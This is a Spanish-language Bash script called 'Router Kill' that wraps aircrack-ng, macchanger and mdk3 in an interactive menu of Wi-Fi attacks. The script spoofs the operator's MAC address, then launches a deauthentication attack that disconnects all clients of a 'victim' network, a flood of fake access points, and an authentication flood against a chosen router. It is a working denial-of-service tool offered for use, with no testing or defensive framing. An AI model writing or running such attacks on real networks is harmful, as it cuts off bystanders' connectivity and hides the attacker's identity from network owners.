#!/bin/bash

#Author: Facu Salgado parte del codigo esta hecho por Hacking.con.H

# trap ctrl-c and call ctrl_c()




#Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"
mon="mon"

#Opciones menu

a="Deauth"
b="Flood Fake Point"
c="Auth"
d="Detener Monitor Mode"
e="Salir"


#verificacion de Dependencias by Hacking.con.H

#root privilegies
if [[ $EUID -ne 0 ]]; then	
echo "														         "
echo "(✗) No eres usuario root, para ejecutar la heramienta tienes que ejecutarla siendo root (✗)      "				  
echo "(✗) You are not a root user, to run the tool you have to run it as root (✗)              "		
exit 1
fi

#airmon-ng
if which airmon-ng >/dev/null; then
sleep 0.25
echo -e "$blue(AIRMONG-NG)$nc ................................................... Instalado [$green✓$nc]"
else
sleep 0.25
echo -e "$red(AIRMONG-NG)$nc No instalado [$red✗$nc]"
sleep 1
echo "Instala escribiendo [sudo apt-get install airckrack-ng]"
sleep 0.25
exit 1
fi

if which airodump-ng >/dev/null; then
sleep 0.25
echo -e "$blue(AIRODUMP-NG)$nc .................................................. Instalado [$green✓$nc]"
else
sleep 0.25
echo -e "$red(AIRODUMP-NG)$nc No instalado [$red✗$nc]"
sleep 1
echo "Instala escribiendo [sudo apt-get install airckrack-ng]"
exit 1
fi

if which mdk3 >/dev/null; then
sleep 0.25
echo -e "$blue(MDK3)$nc ......................................................... Instalado [$green✓$nc]"
sleep 0.25
else
sleep 0.25
echo -e "$red(MDK3)$nc  No instalado [$red✗$nc]"
sleep 1
echo "Clona y instala Mdk3 en [https://github.com/wi-fi-analyzer/mdk3-master]."
exit 1
fi

#macchanger
if which macchanger >/dev/null; then
sleep 0.25
echo -e "$blue(MACCHANGER)$nc ................................................... Instalado [$green✓$nc]"
sleep 0.25
else
sleep 0.25
echo -e "$red(macchanger)$nc  No instalado [$red✗$nc]"
sleep 1
echo "Instala escribiendo [sudo apt-get install macchanger]."
exit 1
fi

if which toilet >/dev/null; then
sleep 1
echo -e "$blue(Toilet)$nc ................................................... Instalado [$green✓$nc]"
else
sleep 1
echo -e "$red(Toilet)$nc No instalado [$red✗$nc]"
sleep 1
echo "Instala escribiendo [sudo apt-get install toilet]"
sleep 1
exit 1
fi

#mensaje y logo bienvenida
clear
tput setaf 3  && toilet --filter border Router Kill
echo -e "$green"
echo "Script creado por Facu Salgado"
sleep 1
echo -e "Regalanos una estrella en github$yellow"
echo
PS3="Selecciona una Opcion: "

#menu principal

select menu in "$a" "$b" "$c" "$d" "$e";
do
case $menu in 

$a)
echo -e "$nc($blue*$nc)$green Este Ataque desautenticara todos los clientes dentro de la red"
sleep 2
echo -e "$nc($blue*$nc)$green le mostraremos sus interfaces de red disponibles"
sleep 2
echo
echo
ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
sleep 1
echo -e "$green"
read -p "EScriba su interfaz ➜ " interface
#cambio de dirección mac
echo -e "$nc($blue*$nc)$green A continuacion daremos de baja tu interfaz para falsificar tu MAC"
sleep 2
ifconfig $interface down
echo -e "$nc($blue*$nc)$green Falsificando tu MAC!!"
sleep 2
macchanger -r $interface
ifconfig $interface up
echo -e "$nc($blue*$nc)$green TU direccion MAC fue falsificada correctamente!!"
sleep 2
echo -e "$nc($blue*$nc)$green Ahora iniciaremos el modo monitor en tu interfaz"
sleep 2
airmon-ng start $interface
pkill dhclient && pkill wpa_supplicant
echo -e "$nc($blue*$nc)$green Modo monitor iniciado correctamente"
sleep 2
echo -e "$nc($blue*$nc)$green Ahora haremos un analisis de las redes disponibles"
sleep 2
echo -e "$nc($blue*$nc)$green Espera 10 segundos cuando inicie el analisis y presiona CTRL + C despues"
sleep 6
airodump-ng $interface$mon
echo
echo -e "$green"
read -p "añade el BSSID victima ➜ " bssid
sleep 2
read -p "añade el CANAL de la red (CH) ➜ " ch
sleep 2
read -p "Añade el nombre en txt para guardar el BSSID ➜ " doc
echo $bssid > $doc
sleep 2
echo -e "$nc($blue*$nc)$green El ataque sera realizado al BSSID:$blue $bssid $green En el Canal: $ch"
sleep 2
echo -e "$nc($blue*$nc)$green el ataque Iniciara en 5 segundos.."
sleep 1
echo "4 segundos.."
sleep 1
echo "3 segundos.."
sleep 1
echo "2 segundos.."
sleep 1
echo "1 segundo"
sleep 1
echo -e "$nc($blue*$nc)$red Ataque Iniciado..$green presione ctrl + c para cancelar el ataque$nc"
mdk3 $interface$mon d -b $doc -c $ch
;;

$b)


echo -e "$nc($blue*$nc)$green Este Ataque Creara un flood de redes WIFI"
sleep 2
echo -e "$nc($blue*$nc)$green le mostraremos sus interfaces de red disponibles"
sleep 2
echo
echo
ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
sleep 1
echo -e "$green"
read -p "EScriba su interfaz ➜ " interface
sleep 2
echo -e "$nc($blue*$nc)$green Ahora iniciaremos el modo monitor en tu interfaz"
sleep 2
airmon-ng start $interface
pkill dhclient && pkill wpa_supplicant
echo -e "$nc($blue*$nc)$green Modo monitor iniciado correctamente"
sleep 2
echo -e "$nc($blue*$nc)$green El ataque comenzara en 5 segundos.."
sleep 1
echo "4 segundos"
sleep 1
echo "3 segundos"
sleep 1
echo "2 segundos"
sleep 1
echo "1 segundos"
sleep 1
echo -e "$nc($blue*$nc)$red ATAQUE INICIADO..$green PRESIONE CTRL + C para cancelar el ataque$nc"
mdk3 $interface$mon b

;;

$c)

ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
sleep 1
echo -e "$green"
read -p "EScriba su interfaz ➜ " interface
airmon-ng start $interface
pkill dhclient && pkill wpa_supplicant
echo -e "$nc($blue*$nc)$green Modo monitor iniciado correctamente"
sleep 2
echo -e "$nc($blue*$nc)$green Ahora haremos un analisis de las redes disponibles"
sleep 2
echo -e "$nc($blue*$nc)$green Espera 10 segundos cuando inicie el analisis y presiona CTRL + C despues"
sleep 6
airodump-ng $interface$mon
echo -e "$green"
read -p "añade el BSSID victima ➜ " bssid
	echo -e "$white"
	echo -e "$bssid" [$green✓$nc]
	echo -e "$green"
read -p "Añade el nombre en txt para guardar el BSSID ➜ " doc
	echo -e "$nc"
	echo $bssid > $doc
	echo -e "$green"
read -p "añade el CANAL de BSSID victima ➜ " ch
	echo -e "$white"
	echo -e "$ch" [$green✓$nc]
	echo -e "$green"
read -p "añade el ESSID victima ➜ " essid
	echo -e "$white"
	echo -e "$essid" [$green✓$nc]
	echo -e "$nc($blue*$nc)$green El ataque comenzara en 5 segundos.."
sleep 1
echo "4 segundos"
sleep 1
echo "3 segundos"
sleep 1
echo "2 segundos"
sleep 1
echo "1 segundos"
sleep 1
echo -e "$nc($blue*$nc)$red ATAQUE INICIADO..$green PRESIONE CTRL + C para cancelar el ataque$nc"
mdk3 $interface$mon a -a $doc; bash


;;

$d)

echo -e "$nc($blue*$nc)$green le mostraremos sus interfaces de red disponibles"
sleep 2
echo -e "$nc($blue*$nc)$green Escriba la interfaz que se encuentre en modo monitor"
echo
echo
ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
sleep 1
echo -e "$green"
read -p "EScriba la interfaz ➜ " interface
echo -e "$nc($blue*$nc)$green Deteniendo modo monitor en 3"
sleep 1
echo "2"
sleep 1
echo "1"
sleep 1
airmon-ng stop $interface
echo -e "$nc($blue*$nc)$green Modo monitor detenido.. saliendo$nc"
exit



;;

$e)

echo -e  "$red(saliendo)..$nc"
exit


;;

*)
echo -e "$red(ERROR)$green Opcion no vaida $nc"
;;
esac 
done


